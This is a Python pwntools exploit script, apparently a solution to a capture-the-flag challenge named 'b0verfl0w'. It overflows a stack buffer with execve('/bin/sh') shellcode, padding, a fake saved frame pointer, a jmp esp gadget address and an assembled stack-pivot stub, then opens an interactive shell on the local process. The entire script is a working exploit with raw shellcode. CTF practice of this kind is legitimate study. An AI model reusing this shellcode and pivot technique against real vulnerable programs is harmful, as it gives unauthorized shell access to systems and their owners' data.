# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

proc_name = 'b0verfl0w'
p = process(proc_name)
padding = 'a' * 0xb
fake_ebp = 'jkjk'
jmp_esp = 0x08048504
# 执行系统调用
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
print(len(shellcode))

esp_pivot = asm('sub esp,0x28;jmp esp')
payload = shellcode + padding + fake_ebp + p32(jmp_esp) + esp_pivot
p.sendline(payload)
p.interactive()
